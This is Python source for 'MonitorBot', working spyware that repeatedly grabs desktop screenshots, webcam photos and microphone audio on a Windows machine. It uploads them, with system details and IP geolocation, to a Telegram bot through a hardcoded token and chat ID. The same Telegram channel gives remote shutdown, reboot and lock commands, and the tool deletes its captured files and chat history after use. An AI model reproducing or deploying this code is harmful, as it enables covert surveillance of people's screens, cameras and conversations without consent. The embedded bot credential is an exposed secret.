"""
🎬 MonitorBot — Full Professional Version

Features:
- Startup: Desktop + Webcam capture (LED warmup)
- Loop: Captures Audio + Desktop + Webcam
- Adjustable loop delay via /setdelay
- Professional Telegram commands with categories
- Thread-safe & debug logging
- Files auto-clean after sending
"""

import os, time, socket, platform, getpass, threading, subprocess
from datetime import datetime
import logging, requests, mss, mss.tools, cv2, numpy as np, sounddevice as sd
from scipy.io.wavfile import write
import psutil

# ---------------- Configuration ----------------
TEMP_DIR = os.getenv("TEMP", r"C:\Windows\Temp")
QUEUE_DIR = os.path.join(TEMP_DIR, "MonitorQueue")
os.makedirs(QUEUE_DIR, exist_ok=True)

AUDIO_DURATION = 30
AUDIO_FS = 44100
UPLOAD_TIMEOUT = 60
LOG_FILE = os.path.join(TEMP_DIR, "monitor_log.txt")

TOKEN = "8375011972:AAF5NvgWpB_ERP1hqjmcrUpoMz3q8pd5JO4"
CHAT_ID = "5846327099"

loop_delay = 30
loop_running = False
loop_thread = None
monitor_active = True
offset = None
DEBUG_MODE = True  # Enable detailed logging

# ---------------- Logging ----------------
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG if DEBUG_MODE else logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %I:%M:%S %p'
)

def log_debug(msg):
    if DEBUG_MODE: logging.debug(msg)

def log_error(msg): logging.error(msg)

# ---------------- Network ----------------
def network_available():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except Exception:
        return False

# ---------------- Telegram Bot ----------------
class TelegramBot:
    def __init__(self, token=TOKEN, chat_id=CHAT_ID):
        self.token = token
        self.chat_id = chat_id

    def _post(self, method, data=None, files=None, timeout=UPLOAD_TIMEOUT):
        url = f"https://api.telegram.org/bot{self.token}/{method}"
        try:
            r = requests.post(url, data=data, files=files, timeout=timeout) if files else requests.post(url, data=data, timeout=timeout)
            log_debug(f"Telegram POST {method} status={r.status_code}")
            return r
        except Exception as e:
            log_error(f"Telegram request failed ({method}): {e}")
            return None

    def send_message(self, text):
        data = {"chat_id": self.chat_id, "text": text, "parse_mode": "Markdown"}
        r = self._post("sendMessage", data=data)
        return bool(r and r.status_code == 200)

    def send_file(self, file_path, file_type="photo", caption=None):
        method, param = ("sendPhoto", "photo") if file_type=="photo" else ("sendAudio", "audio") if file_type=="audio" else ("sendDocument","document")
        try:
            with open(file_path, "rb") as f:
                data = {"chat_id": self.chat_id}
                if caption: data["caption"] = caption
                r = requests.post(f"https://api.telegram.org/bot{self.token}/{method}", data=data, files={param:f}, timeout=UPLOAD_TIMEOUT)
            log_debug(f"File sent {file_path}, type={file_type}")
            return bool(r and r.status_code==200)
        except Exception as e:
            log_error(f"send_file failed: {e}")
            return False

    def send_location(self, latitude, longitude):
        data = {"chat_id": self.chat_id, "latitude": latitude, "longitude": longitude}
        r = self._post("sendLocation", data=data)
        return bool(r and r.status_code==200)

# ---------------- Utilities ----------------
def timestamp_now(): return datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")

# ---------------- Capture Manager ----------------
class CaptureManager:
    def __init__(self, queue_dir=QUEUE_DIR, webcam_warmup=1.0):
        self.queue_dir = queue_dir
        self.webcam_warmup = webcam_warmup

    def capture_desktop(self):
        now = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(self.queue_dir, f"desktop_{now}.png")
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[0]
                img = sct.grab(monitor)
                mss.tools.to_png(img.rgb, img.size, output=file_path)
            self._add_timestamp(file_path)
            log_debug(f"Desktop captured: {file_path}")
            return file_path
        except Exception as e:
            log_error(f"capture_desktop failed: {e}")
            return None

    def capture_webcam(self):
        now = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(self.queue_dir, f"webcam_{now}.png")
        cam = None
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cam.isOpened(): 
                log_error("Webcam not available")
                return None
            start = time.time()
            while time.time() - start < self.webcam_warmup:
                cam.read()
                time.sleep(0.05)
            ret, frame = cam.read()
            if ret and frame is not None:
                cv2.imwrite(file_path, frame)
                self._add_timestamp(file_path)
                log_debug(f"Webcam captured: {file_path}")
                return file_path
            return None
        except Exception as e:
            log_error(f"capture_webcam failed: {e}")
            return None
        finally:
            if cam: cam.release()

    def record_audio(self):
        now = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_path = os.path.join(self.queue_dir, f"audio_{now}.wav")
        try:
            frames = int(AUDIO_DURATION * AUDIO_FS)
            rec = sd.rec(frames, samplerate=AUDIO_FS, channels=1, dtype='float32')
            sd.wait()
            if rec.size == 0:
                log_error("record_audio empty")
                return None
            scaled = rec / np.max(np.abs(rec)) if np.max(np.abs(rec))>0 else rec
            write(audio_path, AUDIO_FS, np.int16(scaled*32767))
            log_debug(f"Audio recorded: {audio_path}")
            return audio_path
        except Exception as e:
            log_error(f"record_audio failed: {e}")
            return None

    def _add_timestamp(self, path):
        try:
            img = cv2.imread(path)
            if img is None: return
            ts = timestamp_now()
            cv2.putText(img, ts, (10, img.shape[0]-10), cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0,255,255),2,cv2.LINE_AA)
            cv2.imwrite(path, img)
        except Exception as e:
            log_error(f"_add_timestamp failed: {e}")

# ---------------- Geo & System ----------------
def get_geo_ip_info():
    try:
        r=requests.get("https://geolocation-db.com/json/", timeout=6)
        if r.ok:
            d=r.json()
            return {"ip":d.get("IPv4","N/A"),"city":d.get("city","N/A"),"region":d.get("state","N/A"),"country":d.get("country_name","N/A"),"latitude":d.get("latitude"),"longitude":d.get("longitude")}
    except Exception as e:
        log_error(f"get_geo_ip_info failed: {e}")
    return {"ip":"N/A","city":"N/A","region":"N/A","country":"N/A","latitude":None,"longitude":None}

def build_location_message():
    hostname = platform.node()
    user = getpass.getuser()
    os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
    cpu_cores = psutil.cpu_count(logical=True)
    ram_gb = round(psutil.virtual_memory().total/(1024**3),2)
    batt = None
    try: batt = psutil.sensors_battery()
    except: pass
    batt_str = f"{int(batt.percent)}% ({'Charging' if batt.power_plugged else 'Not charging'})" if batt else "N/A"
    net_status = "Connected" if network_available() else "Disconnected"
    now = timestamp_now()
    geo = get_geo_ip_info()

    msg = f"""💻 *Device & Location Info*
━━━━━━━━━━━━━━━━━━━━━━
💡 Quick Summary
• 🌐 Network: {net_status}
• 🔋 Battery: {batt_str}
• 🌍 IP: {geo.get('ip','N/A')}
• 🕒 Time: {now}

💻 System Info
• 🖥 Hostname: {hostname}
• 👤 User: {user}
• 🛠 OS: {os_info}
• 🧠 CPU cores: {cpu_cores}
• 💾 RAM: {ram_gb} GB

📍 Geo (IP-based)
• City: {geo.get('city','N/A')}
• Region: {geo.get('region','N/A')}
• Country: {geo.get('country','N/A')}
"""
    return msg, geo

def get_detailed_network_info():
    info = {}
    try: r = requests.get("https://api.ipify.org?format=json", timeout=5); info['wan_ip'] = r.json().get('ip','N/A') if r.ok else 'N/A'
    except: info['wan_ip'] = 'N/A'
    info['user_agent'] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/140.0.0.0 Mobile Safari/537.36"
    try: batt=psutil.sensors_battery(); info['battery'] = f"{batt.percent:.2f}%" if batt else "N/A"
    except: info['battery']="N/A"
    info['network']="Connected" if network_available() else "Disconnected"
    info['datetime']=datetime.now().strftime("%m/%d/%Y, %I:%M:%S %p")
    info['ram']=f"{round(psutil.virtual_memory().total/(1024**3),2)} GB"
    return info

# ---------------- Help Text ----------------
def get_help_text():
    return f"""🎯 *MonitorBot — Commands Overview*

💡 *Monitoring Controls*
• `/monitoron` — Activate the monitoring system
• `/monitoroff` — Pause monitoring temporarily
• `/startloop` — Start automatic capture loop
• `/stoploop` — Stop automatic capture loop
• `/setdelay <secs>` — Set delay between loop captures (minimum 5s)

📸 *Captures*
• `/screenshot` — Capture desktop screenshot instantly
• `/photo` — Capture webcam photo instantly

💻 *System Info*
• `/status` — CPU, RAM usage and IP info
• `/uptime` — System uptime
• `/location` — Device & location info (IP, battery, RAM, etc.)

🔒 *System Actions*
• `/shutdown` — Shutdown in 5 seconds
• `/reboot` — Reboot in 5 seconds
• `/lock` — Lock workstation

🗑️ *Storage & History*
• `/historyclear` — Clear local queue & bot chat

🆘 *Misc*
• `/help` — Show this help menu
"""

# ---------------- Core Functions ----------------
def startup_capture(bot, capture_mgr):
    bot.send_message(f"🔔 *Startup capture initiated* — {timestamp_now()}")
    files=[(capture_mgr.capture_desktop(),"photo"),(capture_mgr.capture_webcam(),"photo")]
    for fpath, ftype in files:
        if fpath and network_available(): bot.send_file(fpath, ftype); 
        try: os.remove(fpath)
        except: pass
    bot.send_message(f"✅ *Startup capture completed* — {timestamp_now()}")

def loop_worker(bot, capture_mgr):
    global loop_running, loop_delay
    while loop_running:
        start=time.time()
        if monitor_active:
            try:
                files=[(capture_mgr.record_audio(),"audio"),(capture_mgr.capture_desktop(),"photo"),(capture_mgr.capture_webcam(),"photo")]
                for fpath, ftype in files:
                    if fpath and network_available(): bot.send_file(fpath, ftype)
                    try: 
                        if fpath and os.path.exists(fpath): os.remove(fpath)
                    except: pass
            except Exception as e: log_error(f"loop_worker error: {e}")
        time.sleep(max(0, loop_delay-(time.time()-start)))

def start_loop(bot, capture_mgr):
    global loop_running, loop_thread
    if loop_running: bot.send_message(f"⚠️ Loop already running — {timestamp_now()}"); return
    loop_running=True
    loop_thread=threading.Thread(target=loop_worker,args=(bot,capture_mgr),daemon=True)
    loop_thread.start()
    bot.send_message(f"▶️ Loop started ({loop_delay}s) — {timestamp_now()}")

def stop_loop(bot=None):
    global loop_running
    if not loop_running:
        if bot: bot.send_message(f"⚠️ Loop is not running — {timestamp_now()}")
        return
    loop_running=False
    if bot: bot.send_message(f"⏸ Loop stopped — {timestamp_now()}")

# ---------------- History ----------------
def clear_local_storage():
    try:
        for f in os.listdir(QUEUE_DIR):
            fpath=os.path.join(QUEUE_DIR,f)
            if os.path.isfile(fpath): os.remove(fpath)
        log_debug("Local storage cleared")
    except Exception as e: log_error(f"clear_local_storage failed: {e}")

def clear_bot_chat(bot):
    global offset
    try:
        resp=requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", params={"timeout":10}, timeout=15)
        if resp.status_code!=200: return
        for update in resp.json().get("result",[]):
            msg=update.get("message")
            if not msg: continue
            chat_id=msg.get("chat",{}).get("id")
            message_id=msg.get("message_id")
            if str(chat_id)==CHAT_ID: requests.post(f"https://api.telegram.org/bot{TOKEN}/deleteMessage", data={"chat_id":chat_id,"message_id":message_id})
        log_debug("Bot chat cleared")
    except Exception as e: log_error(f"clear_bot_chat failed: {e}")

# ---------------- Command Handler ----------------
def handle_telegram_commands(bot, capture_mgr):
    global offset, monitor_active, loop_delay
    while True:
        try:
            params={"timeout":20}
            if offset is not None: params["offset"]=offset
            resp=requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", params=params, timeout=25)
            if resp.status_code!=200: time.sleep(2); continue
            results=resp.json().get("result",[])
            if not results: continue

            for update in results:
                update_id=update.get("update_id")
                msg=update.get("message")
                if not msg or "text" not in msg: continue
                chat_id=str(msg.get("chat",{}).get("id",""))
                if chat_id!=CHAT_ID: continue

                text_raw=msg.get("text","").strip()
                text=text_raw.lower()
                now=timestamp_now()

                if text=="/help": bot.send_message(get_help_text())
                elif text=="/monitoron": monitor_active=True; bot.send_message(f"✅ Monitor Activated — {now}")
                elif text=="/monitoroff": monitor_active=False; bot.send_message(f"⛔ Monitor Paused — {now}")
                elif text=="/screenshot": bot.send_message(f"📸 Capturing desktop — {now}"); f=capture_mgr.capture_desktop(); f and network_available() and bot.send_file(f,"photo"); f and os.path.exists(f) and os.remove(f)
                elif text=="/photo": bot.send_message(f"📷 Capturing webcam — {now}"); f=capture_mgr.capture_webcam(); f and network_available() and bot.send_file(f,"photo"); f and os.path.exists(f) and os.remove(f) or bot.send_message("⚠️ Webcam not available.")
                elif text=="/uptime": bot.send_message(f"⏱ Uptime: {str(datetime.now()-datetime.fromtimestamp(psutil.boot_time())).split('.')[0]} — {now}")
                elif text=="/status": cpu=psutil.cpu_percent(interval=1); ram=psutil.virtual_memory().percent; ip=get_geo_ip_info().get("ip","N/A"); bot.send_message(f"💻 PC Status 💻\n• CPU: {cpu}% | RAM: {ram}% \n• IP: {ip} | Time: {now}")
                elif text.startswith("/setdelay"):
                    try: n=int(text.split()[1]); loop_delay=n if n>=5 else loop_delay; bot.send_message(f"⏱ Loop delay set to {loop_delay}s — {now}" if n>=5 else "⚠️ Minimum delay 5s.")
                    except: bot.send_message("⚠️ Invalid usage. /setdelay <seconds>")
                elif text=="/startloop": start_loop(bot,capture_mgr)
                elif text=="/stoploop": stop_loop(bot)
                elif text=="/location": bot.send_message(f"📡 Gathering location & system info — {now}"); geo_msg,geo=build_location_message(); net_info=get_detailed_network_info(); bot.send_message(f"{geo_msg}\n━━━━━━━━━━━━━━━━━━━━━━\n🌐 WAN IP: {net_info['wan_ip']}\n🖥 User-Agent: {net_info['user_agent']}\n🔋 Battery: {net_info['battery']}\n📶 Network: {net_info['network']}\n🕒 Date & Time: {net_info['datetime']}\n💾 Total RAM: {net_info['ram']}"); geo.get("latitude") and geo.get("longitude") and bot.send_location(geo["latitude"],geo["longitude"])
                elif text=="/shutdown": bot.send_message(f"💤 Shutting down in 5s — {now}"); threading.Thread(target=lambda: os.system("shutdown /s /t 5"), daemon=True).start()
                elif text=="/reboot": bot.send_message(f"♻️ Rebooting in 5s — {now}"); threading.Thread(target=lambda: os.system("shutdown /r /t 5"), daemon=True).start()
                elif text=="/lock": bot.send_message(f"🔒 Locking system — {now}"); threading.Thread(target=lambda: subprocess.run("rundll32.exe user32.dll,LockWorkStation",shell=True),daemon=True).start()
                elif text=="/historyclear": bot.send_message("🗑 Clearing local storage & bot chat..."); clear_local_storage(); clear_bot_chat(bot); bot.send_message(f"✅ History cleared successfully — {now}")

                offset=update_id+1
        except Exception as e: log_error(f"Command handler error: {e}"); time.sleep(2)

# ---------------- Main ----------------
def main():
    bot=TelegramBot()
    capture_mgr=CaptureManager(webcam_warmup=1.0)

    if network_available(): bot.send_message(f"🎬 MonitorBot Started — {timestamp_now()}"); threading.Thread(target=startup_capture,args=(bot,capture_mgr),daemon=True).start()
    threading.Thread(target=handle_telegram_commands,args=(bot,capture_mgr),daemon=True).start()
    start_loop(bot,capture_mgr)

    try: 
        while True: time.sleep(5)
    except KeyboardInterrupt:
        stop_loop()
        bot.send_message(f"🛑 MonitorBot terminated — {timestamp_now()}")

if __name__=="__main__": main()
